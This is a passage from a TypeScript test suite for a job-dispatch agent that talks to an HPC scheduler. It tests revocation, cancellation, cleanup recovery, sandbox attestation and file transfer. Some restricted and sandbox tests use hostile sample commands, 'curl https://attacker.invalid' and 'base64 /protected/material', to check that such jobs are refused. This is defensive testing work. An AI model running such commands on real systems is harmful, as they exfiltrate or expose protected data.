      sleep: async () => {},
      readGpuMetrics: async () => [],
      readDiskUsedPercent: async () => 0,
      readSchedulerQueueDepth: async () => 0,
    });
    activeStreams.push(stream);
    const runPromise = stream.start();

    await waitForCondition(() => reconnect.connectionCount() >= 2);
    const secondSent = reconnect.sentByConnection[1];
    if (!secondSent) throw new Error("second connection messages missing");
    await waitForCondition(
      () => queueInventoryHeartbeats(secondSent, QueueInventoryStatus.UNAVAILABLE).length >= 1,
    );
    await outboundQueue.currentRetryStarted;

    outboundQueue.releaseFirstLoad();
    const firstRequestDone = reconnect.requestDoneByConnection[0];
    if (!firstRequestDone) throw new Error("first request completion missing");
    await firstRequestDone;
    await settle();

    const recoveryState = stream as unknown as {
      queueValidationShadowOutboxUnavailable: boolean;
      queueValidationShadowOutboxFailures: Set<string>;
    };
    expect(recoveryState.queueValidationShadowOutboxUnavailable).toBe(true);
    expect(recoveryState.queueValidationShadowOutboxFailures.has("loadForReplay")).toBe(true);
    expect(queueInventoryHeartbeats(secondSent, QueueInventoryStatus.AVAILABLE)).toHaveLength(0);

    outboundQueue.releaseCurrentRetry();
    stream.stop();
    await runPromise;
  });

  test("rejects a delayed dispatch after its revocation tombstone survives a restart", async () => {
    const db = createSqliteDb(":memory:");
    const tombstones = new JobRevocationTombstones(db);
    const cleanupIntents = new JobCleanupIntents(db);
    const { client: revokeClient } = makeMockClient([]);
    const beforeRestart = new AgentStream({
      client: revokeClient,
      adapter: makeAdapter(),
      agentId: "agent-001",
      siteName: "test-site",
      heartbeatIntervalMs: 60_000,
      logger: silent,
      cleanupIntents,
      revocationTombstones: tombstones,
    });
    const revokeHarness = beforeRestart as unknown as {
      handleServerMessage: (message: unknown) => Promise<void>;
    };
    await revokeHarness.handleServerMessage(
      create(ServerMessageSchema, {
        payload: {
          case: "dataDeliveryRevoke",
          value: { jobId: "fenced-job", reasonCode: "DATA_GRANT_REVOKED", revokedEpoch: 2n },
        },
      }),
    );

    let submitted = false;
    const { client: dispatchClient } = makeMockClient([]);
    const afterRestart = new AgentStream({
      client: dispatchClient,
      adapter: makeAdapter({
        submit: async () => {
          submitted = true;
          return { schedulerJobId: "must-not-submit" };
        },
      }),
      agentId: "agent-001",
      siteName: "test-site",
      heartbeatIntervalMs: 60_000,
      logger: silent,
      cleanupIntents: new JobCleanupIntents(db),
      revocationTombstones: new JobRevocationTombstones(db),
    });
    const dispatchHarness = afterRestart as unknown as {
      handleServerMessage: (message: unknown) => Promise<void>;
    };
    await dispatchHarness.handleServerMessage(
      create(ServerMessageSchema, {
        payload: {
          case: "dispatchJob",
          value: create(DispatchJobSchema, {
            jobId: "fenced-job",
            name: "late delivery",
            command: "true",
            cpus: 1,
            memoryMb: 64n,
            wallTimeSec: 60n,
            dispatchEpoch: 2n,
          }),
        },
      }),
    );

    expect(submitted).toBe(false);
  });

  test("reconciles an active runner before acknowledging cancellation", async () => {
    const db = createSqliteDb(":memory:");
    let markSchedulerCancelStarted: (() => void) | undefined;
    const schedulerCancelStarted = new Promise<void>((resolve) => {
      markSchedulerCancelStarted = resolve;
    });
    let allowSchedulerCancel: (() => void) | undefined;
    const schedulerCancelAllowed = new Promise<void>((resolve) => {
      allowSchedulerCancel = resolve;
    });
    const { client } = makeMockClient([]);
    const stream = new AgentStream({
      client,
      adapter: makeAdapter({
        findByKuintessenceJobId: async () => ({
          status: "found",
          schedulerJobId: "scheduler-active-1",
        }),
        cancel: async () => {
          markSchedulerCancelStarted?.();
          await schedulerCancelAllowed;
        },
      }),
      agentId: "agent-001",
      siteName: "test-site",
      heartbeatIntervalMs: 60_000,
      logger: silent,
      revocationTombstones: new JobRevocationTombstones(db),
    });
    const harness = stream as unknown as {
      handleServerMessage: (message: unknown) => Promise<void>;
      outboundQueue: Array<{ kind: string; jobId?: string; revokedEpoch?: number }>;
      pool: {
        get: (jobId: string) => unknown;
        cancel: (jobId: string) => Promise<void>;
        await: (jobId: string) => Promise<void>;
        stopAll: () => void;
      };
    };
    harness.pool = {
      get: (jobId) => (jobId === "active-without-record" ? {} : undefined),
      cancel: async () => {},
      await: async () => {},
      stopAll: () => {},
    };

    const cancellation = harness.handleServerMessage(cancelJobMessage("active-without-record", 4));
    await schedulerCancelStarted;
    expect(harness.outboundQueue).toEqual([]);

    allowSchedulerCancel?.();
    await cancellation;

    expect(harness.outboundQueue).toEqual([
      { kind: "cancelJobAck", jobId: "active-without-record", revokedEpoch: 4 },
    ]);
    stream.stop();
  });

  test("does not acknowledge when an active runner cannot be reconciled", async () => {
    const db = createSqliteDb(":memory:");
    const { client } = makeMockClient([]);
    const stream = new AgentStream({
      client,
      adapter: makeAdapter({
        findByKuintessenceJobId: async () => ({
          status: "indeterminate",
          reason: "scheduler unavailable",
        }),
      }),
      agentId: "agent-001",
      siteName: "test-site",
      heartbeatIntervalMs: 60_000,
      logger: silent,
      revocationTombstones: new JobRevocationTombstones(db),
    });
    const harness = stream as unknown as {
      handleServerMessage: (message: unknown) => Promise<void>;
      outboundQueue: Array<{ kind: string }>;
      pool: {
        get: (jobId: string) => unknown;
        cancel: (jobId: string) => Promise<void>;
        await: (jobId: string) => Promise<void>;
        stopAll: () => void;
      };
    };
    harness.pool = {
      get: (jobId) => (jobId === "unreconciled-active" ? {} : undefined),
      cancel: async () => {},
      await: async () => {},
      stopAll: () => {},
    };

    await harness.handleServerMessage(cancelJobMessage("unreconciled-active", 5));

    expect(harness.outboundQueue).toEqual([]);
    stream.stop();
  });

  test("submits a repeated dispatch epoch only once", async () => {
    const db = createSqliteDb(":memory:");
    let submitted = 0;
    const { client } = makeMockClient([]);
    const stream = new AgentStream({
      client,
      adapter: makeAdapter({
        submit: async () => {
          submitted += 1;
          return { schedulerJobId: "scheduler-duplicate" };
        },
      }),
      agentId: "agent-001",
      siteName: "test-site",
      heartbeatIntervalMs: 60_000,
      logger: silent,
      inboundAcks: new InboundAcks(db),
    });
    const harness = stream as unknown as {
      handleServerMessage: (message: unknown) => Promise<void>;
    };
    const dispatch = create(ServerMessageSchema, {
      payload: {
        case: "dispatchJob",
        value: create(DispatchJobSchema, {
          jobId: "duplicate-job",
          name: "duplicate",
          command: "true",
          cpus: 1,
          memoryMb: 64n,
          wallTimeSec: 60n,
          dispatchEpoch: 1n,
        }),
      },
    });

    await harness.handleServerMessage(dispatch);
    await harness.handleServerMessage(dispatch);
    await settle();

    expect(submitted).toBe(1);
    stream.stop();
  });

  test("recovers orphaned cleanup intents before job resumption and deletes only successful work", async () => {
    const db = createSqliteDb(":memory:");
    const intents = new JobCleanupIntents(db);
    await intents.recordDataDelivery("orphan-1", {
      bindingId: "binding-1",
      targetPath: "/agent/jobs/orphan-1/input.dat",
      method: "stage-copy",
    });
    await intents.recordLicensedMount("orphan-1", {
      selectorId: "potcar-pbe",
      targetPath: "/agent/jobs/orphan-1/POTCAR",
    });
    const events: string[] = [];
    const { client } = makeMockClient([]);
    const stream = new AgentStream({
      client,
      adapter: makeAdapter(),
      agentId: "agent-001",
      siteName: "test-site",
      heartbeatIntervalMs: 60_000,
      logger: silent,
      activeRemoteJobs: new ActiveRemoteJobs(db),
      cleanupIntents: intents,
      dataDeliveryExecutor: {
        prepare: async () => [],
        recover: async (jobId, deliveries) => {
          events.push(`recover-data:${jobId}:${deliveries[0]?.targetPath}`);
        },
        release: async (jobId) => {
          events.push(`release-data:${jobId}`);
        },
      },
      licensedMaterialResolver: {
        prepare: async () => [],
        release: async (mounts) => {
          events.push(`release-license:${mounts[0]?.targetPath}`);
        },
      },
    });
    const harness = stream as unknown as {
      recoverOrphanedCleanupIntents: () => Promise<void>;
    };

    await harness.recoverOrphanedCleanupIntents();

    expect(events).toContain("recover-data:orphan-1:/agent/jobs/orphan-1/input.dat");
    expect(events).toContain("release-data:orphan-1");
    expect(events).toContain("release-license:/agent/jobs/orphan-1/POTCAR");
    expect(await intents.list()).toEqual([]);
  });

  test("retains an orphaned cleanup intent when recovery cleanup fails", async () => {
    const db = createSqliteDb(":memory:");
    const intents = new JobCleanupIntents(db);
    await intents.recordDataDelivery("orphan-failure", {
      bindingId: "binding-1",
      targetPath: "/agent/jobs/orphan-failure/input.dat",
      method: "stage-copy",
    });
    await intents.recordLicensedMount("orphan-failure", {
      selectorId: "potcar-pbe",
      targetPath: "/agent/jobs/orphan-failure/POTCAR",
    });
    let licensedCleanupAttempted = false;
    const { client } = makeMockClient([]);
    const stream = new AgentStream({
      client,
      adapter: makeAdapter(),
      agentId: "agent-001",
      siteName: "test-site",
      heartbeatIntervalMs: 60_000,
      logger: silent,
      activeRemoteJobs: new ActiveRemoteJobs(db),
      cleanupIntents: intents,
      dataDeliveryExecutor: {
        prepare: async () => [],
        recover: async () => {},
        release: async () => {
          throw new Error("busy");
        },
      },
      licensedMaterialResolver: {
        prepare: async () => [],
        release: async () => {
          licensedCleanupAttempted = true;
        },
      },
    });
    const harness = stream as unknown as {
      recoverOrphanedCleanupIntents: () => Promise<void>;
    };

    await harness.recoverOrphanedCleanupIntents();

    expect(await intents.list()).toHaveLength(1);
    expect(licensedCleanupAttempted).toBe(true);
  });

  test("retains an orphaned cleanup intent when scheduler UUID lookup is indeterminate", async () => {
    const db = createSqliteDb(":memory:");
    const intents = new JobCleanupIntents(db);
    await intents.recordDataDelivery("uncertain-job", {
      bindingId: "binding-1",
      targetPath: "/agent/jobs/uncertain-job/input.dat",
      method: "stage-copy",
    });
    let cleanupAttempted = false;
    const { client } = makeMockClient([]);
    const stream = new AgentStream({
      client,
      adapter: makeAdapter({
        findByKuintessenceJobId: async () => ({
          status: "indeterminate",
          reason: "scheduler API unavailable",
        }),
      }),
      agentId: "agent-001",
      siteName: "test-site",
      heartbeatIntervalMs: 60_000,
      logger: silent,
      activeRemoteJobs: new ActiveRemoteJobs(db),
      cleanupIntents: intents,
      dataDeliveryExecutor: {
        prepare: async () => [],
        recover: async () => {
          cleanupAttempted = true;
        },
        release: async () => {
          cleanupAttempted = true;
        },
      },
    });
    const harness = stream as unknown as {
      recoverOrphanedCleanupIntents: () => Promise<void>;
    };

    await harness.recoverOrphanedCleanupIntents();

    expect(cleanupAttempted).toBe(false);
    expect(await intents.list()).toHaveLength(1);
  });

  test("only clears an orphaned intent after a found scheduler job is cancelled", async () => {
    const db = createSqliteDb(":memory:");
    const intents = new JobCleanupIntents(db);
    await intents.recordDataDelivery("cancel-failure", {
      bindingId: "binding-1",
      targetPath: "/agent/jobs/cancel-failure/input.dat",
      method: "stage-copy",
    });
    let cleanupAttempted = false;
    const { client } = makeMockClient([]);
    const stream = new AgentStream({
      client,
      adapter: makeAdapter({
        findByKuintessenceJobId: async () => ({
          status: "found",
          schedulerJobId: "scheduler-42",
        }),
        cancel: async () => {
          throw new Error("scheduler rejected cancellation");
        },
      }),
      agentId: "agent-001",
      siteName: "test-site",
      heartbeatIntervalMs: 60_000,
      logger: silent,
      activeRemoteJobs: new ActiveRemoteJobs(db),
      cleanupIntents: intents,
      dataDeliveryExecutor: {
        prepare: async () => [],
        recover: async () => {
          cleanupAttempted = true;
        },
        release: async () => {
          cleanupAttempted = true;
        },
      },
    });
    const harness = stream as unknown as {
      recoverOrphanedCleanupIntents: () => Promise<void>;
    };

    await harness.recoverOrphanedCleanupIntents();

    expect(cleanupAttempted).toBe(false);
    expect(await intents.list()).toHaveLength(1);
  });

  test("resumes active jobs when no revocation tombstone exists", async () => {
    const db = createSqliteDb(":memory:");
    const activeRemoteJobs = new ActiveRemoteJobs(db);
    await activeRemoteJobs.recordSubmitted({
      schedulerJobId: "scheduler-42",
      spec: {
        jobId: "active-job",
        name: "active",
        command: "true",
        cpus: 1,
        memoryMb: 64,
        gpus: 0,
        wallTimeSec: 60,
        workingDir: "/agent/jobs/active-job",
        envVars: {},
      },
      expectedOutputs: [],
    });
    const { client } = makeMockClient([]);
    let preparedReplacementRoot = false;
    const stream = new AgentStream({
      client,
      adapter: makeAdapter({ statusSeq: [{ status: "queued" }] }),
      agentId: "agent-001",
      siteName: "test-site",
      heartbeatIntervalMs: 60_000,
      logger: silent,
      activeRemoteJobs,
      cleanupIntents: new JobCleanupIntents(db),
      revocationTombstones: new JobRevocationTombstones(db),
      prepareJobWorkRoot: async () => {
        preparedReplacementRoot = true;
        return "/agent/jobs/replaced";
      },
      jobSleep: async () => new Promise<void>(() => {}),
    });
    const harness = stream as unknown as {
      recoverActiveRemoteJobs: () => Promise<void>;
      pool: { get: (jobId: string) => unknown };
    };

    await harness.recoverActiveRemoteJobs();
    await settle();

    expect(harness.pool.get("active-job")).toBeDefined();
    expect(preparedReplacementRoot).toBe(false);
    stream.stop();
  });

  test("cancels a submitted scheduler job when active-job persistence fails", async () => {
    const db = createSqliteDb(":memory:");
    const cancelled: string[] = [];
    const { client } = makeMockClient([
      create(ServerMessageSchema, {
        payload: {
          case: "dispatchJob",
          value: create(DispatchJobSchema, {
            jobId: "persist-failure",
            name: "persist failure",
            command: "true",
            cpus: 1,
            memoryMb: 64n,
            wallTimeSec: 60n,
          }),
        },
      }),
    ]);
    const stream = new AgentStream({
      client,
      adapter: makeAdapter({
        submit: async () => ({ schedulerJobId: "scheduler-persist-failure" }),
        cancel: async (schedulerJobId) => {
          cancelled.push(schedulerJobId);
        },
      }),
      agentId: "agent-001",
      siteName: "test-site",
      heartbeatIntervalMs: 60_000,
      logger: silent,
      activeRemoteJobs: new FailingActiveRemoteJobs(db),
      cleanupIntents: new JobCleanupIntents(db),
      reconnectBackoffMs: 1,
      sleep: async () => {},
    });
    activeStreams.push(stream);

    const runPromise = stream.start();
    await settle();
    stream.stop();
    await runPromise;

    expect(cancelled.length).toBeGreaterThan(0);
    expect(
      cancelled.every((schedulerJobId) => schedulerJobId === "scheduler-persist-failure"),
    ).toBe(true);
  });

  test("clears a cleanup intent after normal preparation failure cleanup", async () => {
    const db = createSqliteDb(":memory:");
    const intents = new JobCleanupIntents(db);
    let released = false;
    const { client } = makeMockClient([]);
    const stream = new AgentStream({
      client,
      adapter: makeAdapter(),
      agentId: "agent-001",
      siteName: "test-site",
      heartbeatIntervalMs: 60_000,
      logger: silent,
      cleanupIntents: intents,
      dataDeliveryExecutor: {
        prepare: async (jobId, _bindings, options) => {
          await options?.beforeSideEffect?.({
            bindingId: "binding-1",
            targetPath: `/agent/jobs/${jobId}/input.dat`,
            method: "stage-copy",
            protectedPath: false,
          });
          throw new Error("prepare failed");
        },
        recover: async () => {},
        release: async () => {
          released = true;
        },
      },
    });
    const dispatch = create(DispatchJobSchema, {
      jobId: "prepare-failure",
      dataDeliveries: [create(DataDeliveryBindingSchema, {})],
    });
    const harness = stream as unknown as {
      submitWithLicensedMaterials: (
        message: typeof dispatch,
        spec: JobSpec,
        expectedOutputs: [],
      ) => Promise<void>;
    };

    await expect(
      harness.submitWithLicensedMaterials(
        dispatch,
        {
          jobId: "prepare-failure",
          name: "failure",
          command: "true",
          cpus: 1,
          memoryMb: 64,
          gpus: 0,
          wallTimeSec: 60,
          workingDir: "/agent/jobs/prepare-failure",
          envVars: {},
        },
        [],
      ),
    ).rejects.toThrow("prepare failed");

    expect(released).toBe(true);
    expect(await intents.list()).toEqual([]);
  });

  test("fails closed when restricted isolation is not advertised", async () => {
    let submitted = false;
    const serverMsgs = [
      create(ServerMessageSchema, {
        payload: {
          case: "registerResponse",
          value: create(RegisterResponseSchema, { accepted: true, message: "ok" }),
        },
      }),
      create(ServerMessageSchema, {
        payload: {
          case: "dispatchJob",
          value: create(DispatchJobSchema, {
            jobId: "restricted-1",
            name: "restricted",
            command: "base64 /protected/material",
            cpus: 1,
            memoryMb: 1024n,
            restrictedNoEgress: true,
          }),
        },
      }),
    ];
    const { client, sent } = makeMockClient(serverMsgs, 20);
    const stream = new AgentStream({
      client,
      adapter: makeAdapter({
        submit: async () => {
          submitted = true;
          return { schedulerJobId: "must-not-run" };
        },
      }),
      agentId: "agent-001",
      siteName: "test-site",
      heartbeatIntervalMs: 60_000,
      logger: silent,
      reconnectBackoffMs: 1,
      sleep: async () => {},
      restrictedDataIsolation: false,
    });
    activeStreams.push(stream);

    const runPromise = stream.start();
    await settle(20);
    stream.stop();
    await runPromise;

    expect(submitted).toBe(false);
    const failed = sent.find(
      (message) =>
        (message as { payload: { case: string; value?: { jobId?: string } } }).payload.case ===
          "jobStatus" &&
        (message as { payload: { value: { jobId: string } } }).payload.value.jobId ===
          "restricted-1",
    ) as { payload: { value: { message: string } } } | undefined;
    expect(failed?.payload.value.message).toContain("trusted execution profile");
  });

  test("rejects a raw scheduler command even when a trusted profile is advertised", async () => {
    let submitted = false;
    const { client, sent } = makeMockClient(
      [
        create(ServerMessageSchema, {
          payload: {
            case: "registerResponse",
            value: create(RegisterResponseSchema, { accepted: true, message: "ok" }),
          },
        }),
        create(ServerMessageSchema, {
          payload: {
            case: "registerResponse",
            value: create(RegisterResponseSchema, { accepted: true, message: "ok" }),
          },
        }),
        create(ServerMessageSchema, {
          payload: {
            case: "dispatchJob",
            value: create(DispatchJobSchema, {
              jobId: "restricted-raw-1",
              name: "restricted",
              command: "curl https://attacker.invalid",
              cpus: 1,
              memoryMb: 1024n,
              restrictedNoEgress: true,
            }),
          },
        }),
      ],
      20,
    );
    const stream = new AgentStream({
      client,
      adapter: makeAdapter({
        submit: async () => {
          submitted = true;
          return { schedulerJobId: "must-not-run" };
        },
      }),
      agentId: "agent-001",
      siteName: "test-site",
      heartbeatIntervalMs: 60_000,
      logger: silent,
      reconnectBackoffMs: 1,
      sleep: async () => {},
      restrictedExecutionProfile: {
        enabled: true,
        ready: true,
        runtimeDigest: `sha256:${"1".repeat(64)}`,
        runtimePath: "/trusted/runtime.sif",
        apptainerPath: "apptainer",
        trustedWrapperPath: "/trusted/kq-sandbox-wrapper",
        missingRequirements: [],
      },
    });
    activeStreams.push(stream);

    const runPromise = stream.start();
    await settle(20);
    stream.stop();
    await runPromise;

    expect(submitted).toBe(false);
    const failed = sent.find(
      (message) =>
        (message as { payload: { case: string; value?: { jobId?: string } } }).payload.case ===
          "jobStatus" &&
        (message as { payload: { value: { jobId: string } } }).payload.value.jobId ===
          "restricted-raw-1",
    ) as { payload: { value: { message: string } } } | undefined;
    expect(failed?.payload.value.message).toContain("rejects raw scheduler commands");
  });

  test("uses the verified Sandbox processor result instead of DispatchJob.command", async () => {
    const serverMsgs = [
      create(ServerMessageSchema, {
        payload: {
          case: "dispatchJob",
          value: create(DispatchJobSchema, {
            jobId: "00000000-0000-0000-0000-000000000111",
            name: "Human readable Sandbox",
            command: "curl https://attacker.invalid",
            cpus: 1,
            memoryMb: 512n,
            wallTimeSec: 60n,
            envVars: { HOST_SECRET: "no" },
            inputStaging: [
              {
                fileMetadataId: "file-1",
                stagePath: "inputs/data.txt",
                sourceUrl: "https://storage.example/input",
              },
            ],
            sandboxExecution: create(SandboxExecutionSchema, { networkDisabled: true }),
          }),
        },
      }),
    ];
    const { client } = makeMockClient(serverMsgs);
    const submitted: JobSpec[] = [];
    const schedulerSubmissionSteps: string[] = [];
    const sandboxInputSources: unknown[] = [];
    const stream = new AgentStream({
      client,
      adapter: makeAdapter({
        submit: async (spec) => {
          schedulerSubmissionSteps.push("submit");
          submitted.push(spec);
          return { schedulerJobId: "sandbox-1" };
        },
      }),
      agentId: "agent-001",
      siteName: "test-site",
      heartbeatIntervalMs: 60_000,
      reconnectBackoffMs: 1,
      sleep: async () => {},
      logger: silent,
      sandboxProcessor: {
        prepare: async (_jobId, _execution, inputSources) => {
          sandboxInputSources.push(inputSources);
          return {
            workingDir: "/managed/sandbox/job",
            runtimeDigest: `sha256:${"1".repeat(64)}`,
            sandbox: {
              language: "python",
              entrypoint: "main.py",
              scriptContent: "print('ok')\n",
              scriptHostPath: "/managed/sandbox/job/main.py",
              contextHostPath: "/managed/sandbox/job/context.json",
              runtimeKind: "SIF",
              runtimePath: "/managed/runtime.sif",
              executionMode: "RootImpersonation",
              identity: {
                mode: "MappedAccount",
                backend: "Unix",
                accountId: "00000000-0000-0000-0000-000000000333",
                username: "scientist",
                uid: 1001,
                gid: 1001,
                allowedQueues: [],
              },
              mounts: [],
              limits: { pids: 32, outputBytes: 1_000, logBytes: 1_000 },
            },
          };
        },
      },
      assertSandboxRuntimeAttestation: async (sandbox, runtimeDigest) => {
        schedulerSubmissionSteps.push("attestation");
        expect(sandbox.runtimePath).toBe("/managed/runtime.sif");
        expect(runtimeDigest).toBe(`sha256:${"1".repeat(64)}`);
      },
    });
    activeStreams.push(stream);
    const running = stream.start();
    await settle(20);
    stream.stop();
    await running;
    expect(submitted.length).toBeGreaterThan(0);
    expect(submitted[0]?.command).toBe("sandbox-manifest");
    expect(submitted[0]?.schedulerName).toBe("kq-00000000000");
    expect(submitted[0]?.workingDir).toBe("/managed/sandbox/job");
    expect(submitted[0]?.envVars).toEqual({});
    expect(JSON.stringify(submitted[0])).not.toContain("attacker.invalid");
    expect(JSON.stringify(submitted[0])).not.toContain("HOST_SECRET");
    expect(schedulerSubmissionSteps).toEqual(["attestation", "submit"]);
    expect(sandboxInputSources.length).toBeGreaterThan(0);
    expect(sandboxInputSources[0]).toEqual([
      {
        stagePath: "inputs/data.txt",
        sourceUrl: "https://storage.example/input",
      },
    ]);
  });

  test("fails closed when the Sandbox attestation verifier is unavailable", async () => {
    let submitted = false;
    const { client, sent } = makeMockClient(
      [
        create(ServerMessageSchema, {
          payload: {
            case: "registerResponse",
            value: create(RegisterResponseSchema, { accepted: true, message: "ok" }),
          },
        }),
        create(ServerMessageSchema, {
          payload: {
            case: "dispatchJob",
            value: create(DispatchJobSchema, {
              jobId: "00000000-0000-0000-0000-000000000112",
              name: "sandbox-no-attestation",
              cpus: 1,
              memoryMb: 512n,
              wallTimeSec: 60n,
              sandboxExecution: create(SandboxExecutionSchema, { networkDisabled: true }),
            }),
          },
        }),
      ],
      20,
    );
    const stream = new AgentStream({
      client,
      adapter: makeAdapter({
        submit: async () => {
          submitted = true;
          return { schedulerJobId: "must-not-submit" };
        },
      }),
      agentId: "agent-001",
      siteName: "test-site",
      heartbeatIntervalMs: 60_000,
      reconnectBackoffMs: 1,
      sleep: async () => {},
      logger: silent,
      sandboxProcessor: {
        prepare: async () => ({
          workingDir: "/managed/sandbox/job",
          runtimeDigest: `sha256:${"1".repeat(64)}`,
          sandbox: {
            language: "python",
            entrypoint: "main.py",
            scriptContent: "print('ok')\n",
            scriptHostPath: "/managed/sandbox/job/main.py",
            contextHostPath: "/managed/sandbox/job/context.json",
            runtimeKind: "SIF",
            runtimePath: "/managed/runtime.sif",
            executionMode: "RootImpersonation",
            identity: {
              mode: "MappedAccount",
              backend: "Unix",
              accountId: "00000000-0000-0000-0000-000000000333",
              username: "scientist",
              uid: 1001,
              gid: 1001,
              allowedQueues: [],
            },
            mounts: [],
            limits: { pids: 32, outputBytes: 1_000, logBytes: 1_000 },
          },
        }),
      },
    });
    activeStreams.push(stream);

    const running = stream.start();
    await settle(20);
    stream.stop();
    await running;

    expect(submitted).toBe(false);
    const failed = sent.find(
      (message) =>
        (message as { payload?: { case?: string; value?: { jobId?: string; message?: string } } })
          .payload?.case === "jobStatus" &&
        (message as { payload: { value: { jobId?: string } } }).payload.value.jobId ===
          "00000000-0000-0000-0000-000000000112",
    ) as { payload: { value: { message: string } } } | undefined;
    expect(failed?.payload.value.message).toContain("attestation verifier is unavailable");
  });

  test("acknowledges Sandbox artifact release results", async () => {
    const serverMsgs = [
      create(ServerMessageSchema, {
        payload: {
          case: "registerResponse",
          value: create(RegisterResponseSchema, { accepted: true, message: "ok" }),
        },
      }),
      create(ServerMessageSchema, {
        payload: {
          case: "sandboxArtifactRelease",
          value: create(SandboxArtifactReleaseSchema, {
            requestId: "release-1",
            items: [
              create(SandboxArtifactReleaseItemSchema, {
                replicaId: "replica-1",
                storageRef: "/managed/job/output",
              }),
            ],
          }),
        },
      }),
    ];
    const { client, sent } = makeMockClient(serverMsgs, 20);
    const stream = new AgentStream({
      client,
      adapter: makeAdapter(),
      agentId: "agent-001",
      siteName: "test-site",
      heartbeatIntervalMs: 60_000,
      logger: silent,
      reconnectBackoffMs: 1,
      sleep: async () => {},
      releaseSandboxArtifacts: async () => ({
        releasedReplicaIds: ["replica-1"],
        failures: {},
      }),
    });
    activeStreams.push(stream);
    const running = stream.start();
    await settle(20);
    stream.stop();
    await running;
    const ack = sent.find(
      (message) =>
        (message as { payload: { case: string } }).payload.case === "sandboxArtifactReleaseAck",
    ) as
      | {
          payload: {
            value: { requestId: string; releasedReplicaIds: string[] };
          };
        }
      | undefined;
    expect(ack?.payload.value.requestId).toBe("release-1");
    expect(ack?.payload.value.releasedReplicaIds).toEqual(["replica-1"]);
  });

  test("host-side multipart upload applies the configured connectTo rewrite", async () => {
    const dir = await mkdtemp(join(tmpdir(), "kq-stream-multipart-"));
    const filePath = join(dir, "out.txt");
    await writeFile(filePath, "abc");

    const originalFetch = globalThis.fetch;
    let putUrl = "";
    const fetchStub = (async (...args: Parameters<typeof fetch>): Promise<Response> => {
      const [input] = args;
      putUrl = input instanceof URL ? input.toString() : String(input);
      return new Response("", { status: 200, headers: { etag: "etag-1" } });
    }) as typeof fetch;
    fetchStub.preconnect = originalFetch.preconnect;
    globalThis.fetch = fetchStub;

    try {
      const { client } = makeMockClient([]);
      const stream = new AgentStream({
        fileTransferMaxRetries: 0,
        fileTransferRetryBackoffSec: 0,
        fileTransferConnectTo: "localhost:19000:host.docker.internal:19000",
        client,
        adapter: makeAdapter(),
        agentId: "agent-001",
        siteName: "test-site",
        heartbeatIntervalMs: 60_000,
        logger: silent,
        reconnectBackoffMs: 1,
        sleep: async () => {},
      });

      const harness = stream as unknown as {
        requestPartUrls: (
          requestId: string,
          partNumbers: number[],
          signal: AbortSignal,
        ) => Promise<{ partNumber: number; url: string }[]>;
        runHostClusterToCloudMultipart: (
          requestId: string,
          sourcePath: string,
          partSize: number,
          signal: AbortSignal,
        ) => Promise<void>;
      };
      harness.requestPartUrls = async (_requestId, partNumbers) =>
        partNumbers.map((partNumber) => ({
          partNumber,
          url: `http://localhost:19000/kq-netdrive/object?partNumber=${partNumber}`,
        }));

      await harness.runHostClusterToCloudMultipart(
        "transfer-1",
        filePath,
        5 * 1024 * 1024,
        new AbortController().signal,
      );

      expect(putUrl).toStartWith("http://host.docker.internal:19000/");
    } finally {
      globalThis.fetch = originalFetch;
      await rm(dir, { recursive: true, force: true });
    }
  });

  test("aborts an active file transfer when the Server sends FileTransferCancel", async () => {
    const { client } = makeMockClient([]);
    const stream = new AgentStream({
      client,
      adapter: makeAdapter(),
      agentId: "agent-001",
      siteName: "test-site",
      heartbeatIntervalMs: 60_000,
      logger: silent,
    });
    const controller = new AbortController();
    const harness = stream as unknown as {
      activeFileTransfers: Map<string, AbortController>;
      handleServerMessage: (message: unknown) => Promise<void>;
    };
    harness.activeFileTransfers.set("transfer-cancel", controller);

    await harness.handleServerMessage(
      create(ServerMessageSchema, {
        payload: {
          case: "fileTransferCancel",
          value: create(FileTransferCancelSchema, { requestId: "transfer-cancel" }),
        },
      }),
    );

    expect(controller.signal.aborted).toBe(true);
    stream.stop();
  });

  test("returns a bounded typed job-log response through the Agent stream", async () => {
    const calls: unknown[] = [];
    const serverMsgs = [
      create(ServerMessageSchema, {
        payload: {
          case: "registerResponse",
          value: create(RegisterResponseSchema, { accepted: true, message: "ok" }),
        },
      }),
      create(ServerMessageSchema, {
        payload: {
          case: "jobLogsRequest",
          value: create(JobLogsRequestSchema, {
            requestId: "logs-1",
            schedulerJobId: "scheduler-42",
            lines: 6_000,
            jobId: "19a20bcd-9761-4659-be4a-5ba445befc0a",
          }),
        },
      }),
    ];
    const { client, sent } = makeMockClient(serverMsgs, 20);
    const stream = new AgentStream({
      client,
      adapter: makeAdapter({
        getJobLogs: async (...args) => {
          calls.push(args);
          return `${"x".repeat(1024 * 1024 + 100)}\n`;
        },
      }),
      agentId: "agent-001",
      siteName: "test-site",
      heartbeatIntervalMs: 60_000,
      logger: silent,
      reconnectBackoffMs: 1,
      sleep: async () => {},
    });
    activeStreams.push(stream);

    const runPromise = stream.start();
    await settle(20);
    stream.stop();
    await runPromise;

    const response = sent.find(
      (message) => (message as { payload: { case: string } }).payload.case === "jobLogsResponse",
    ) as
      | {
          payload: {
            value: { requestId: string; text: string; error: string; unavailable: boolean };
          };
        }
      | undefined;
    expect(calls.length).toBeGreaterThanOrEqual(1);
    expect(
      calls.every(
        (call) =>
          JSON.stringify(call) ===
          JSON.stringify(["scheduler-42", 5_000, "19a20bcd-9761-4659-be4a-5ba445befc0a"]),
      ),
    ).toBe(true);
    expect(response?.payload.value.requestId).toBe("logs-1");
    expect(Buffer.byteLength(response?.payload.value.text ?? "")).toBeLessThanOrEqual(1024 * 1024);
    expect(response?.payload.value.text.endsWith("\n")).toBe(true);
    expect(response?.payload.value.error).toBe("");
    expect(response?.payload.value.unavailable).toBe(false);
  });

  test("reports a known missing job log without an adapter error", async () => {
    const serverMsgs = [
      create(ServerMessageSchema, {
        payload: {
          case: "registerResponse",
          value: create(RegisterResponseSchema, { accepted: true, message: "ok" }),
        },
      }),
      create(ServerMessageSchema, {
        payload: {
          case: "jobLogsRequest",
          value: create(JobLogsRequestSchema, {
            requestId: "missing-logs",
            schedulerJobId: "scheduler-42",
            lines: 50,
            jobId: "19a20bcd-9761-4659-be4a-5ba445befc0a",
          }),
        },
      }),
    ];
    const { client, sent } = makeMockClient(serverMsgs, 20);
    const stream = new AgentStream({
      client,
      adapter: makeAdapter({
        getJobLogs: async () => {
          throw new JobLogUnavailableError();
        },
      }),
      agentId: "agent-001",
      siteName: "test-site",
      heartbeatIntervalMs: 60_000,
      logger: silent,
      reconnectBackoffMs: 1,
      sleep: async () => {},
    });
    activeStreams.push(stream);

    const runPromise = stream.start();
    await settle(20);
    stream.stop();
